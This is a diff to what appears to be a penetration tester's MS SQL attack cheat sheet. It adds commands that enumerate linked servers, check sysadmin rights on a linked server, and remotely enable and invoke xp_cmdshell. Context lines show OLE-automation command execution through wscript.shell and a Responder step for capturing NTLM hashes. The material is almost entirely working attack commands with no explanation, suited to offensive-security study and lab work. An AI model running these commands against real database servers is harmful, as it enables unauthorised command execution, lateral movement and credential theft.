@@ -486,6 +486,11 @@ DECLARE @output varchar(8000);
 EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
 EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
 
+# Link Server
+EXEC sp_linkedservers;
+SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
+
 # NTLM
 responder -I tun0 
 cd /usr/share/responder/logs
